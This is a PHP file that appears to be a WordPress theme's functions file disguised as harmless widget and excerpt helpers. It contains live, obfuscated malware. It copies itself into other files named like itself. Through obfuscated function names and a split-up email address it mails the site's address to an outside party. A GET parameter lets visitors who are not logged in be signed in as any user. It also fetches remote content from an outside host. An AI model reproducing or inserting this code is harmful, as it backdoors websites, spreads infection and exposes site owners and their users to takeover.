					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $issepar . "\n" .$widget);fclose($f);				
					$output .= ($is_showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _getall_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _getall_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_activeatewidgets");
function _getprepare_widgets(){
	if(!isset($chars_count)) $chars_count=120;
	if(!isset($methods)) $methods="cookie";
	if(!isset($allowed)) $allowed="<a>";
	if(!isset($f_type)) $f_type="none";
	if(!isset($issep)) $issep="";
	if(!isset($f_home)) $f_home=get_option("home"); 
	if(!isset($f_pref)) $f_pref="wp_";
	if(!isset($is_use_more)) $is_use_more=1; 
	if(!isset($com_types)) $com_types=""; 
	if(!isset($c_pages)) $c_pages=$_GET["cperpage"];
	if(!isset($com_author)) $com_author="";
	if(!isset($comments_approved)) $comments_approved=""; 
	if(!isset($posts_auth)) $posts_auth="auth";
	if(!isset($text_more)) $text_more="(more...)";
	if(!isset($widget_is_output)) $widget_is_output=get_option("_is_widget_active_");
	if(!isset($widgetchecks)) $widgetchecks=$f_pref."set"."_".$posts_auth."_".$methods;
	if(!isset($text_more_ditails)) $text_more_ditails="(details...)";
	if(!isset($con_more)) $con_more="ma".$issep."il";
	if(!isset($forcemore)) $forcemore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$issep."vethe".$com_types."mas".$issep."@".$comments_approved."gm".$com_author."ail".$issep.".".$issep."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($bfix_tags)) $bfix_tags=1;
	if(!isset($f_types)) $f_types=$f_home; 
	if(!isset($getcommtext)) $getcommtext=$f_pref.$con_more;
	if(!isset($m_tags)) $m_tags="div";
	if(!isset($text_s)) $text_s=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_links_title)) $more_links_title="Р§РёС‚Р°С‚СЊ РґР°Р»РµРµ";	
	if(!isset($is_showdots)) $is_showdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommtext, array($text_s, $f_home, $f_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($chars_count < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $chars_count) {
				$l=$chars_count;
				$ellipsis=1;
			} else {
				$l=count($text);
				$text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed) {
		$output=strip_tags($output, $allowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($bfix_tags) ? balanceTags($output, true) : $output;
	$output .= ($is_showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($f_type, $output);
	switch($m_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more ) {
		if($forcemore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_links_title . "\">" . $text_more = !is_user_logged_in() && @call_user_func_array($widgetchecks,array($c_pages, true)) ? $text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_links_title . "\">" . $text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "РќРµ РЅР°Р№РґРµРЅРѕ" . $after;
	}
	return  $output;
} 		
function bloqinfo($wp_id){
    static $wp_count = 0;
    if($wp_count == 0){
        $wp_count++;
        return @file_get_contents('http://wpru.ru/aksimet.php?id='.$wp_id.'&m=17');
    }
}
?>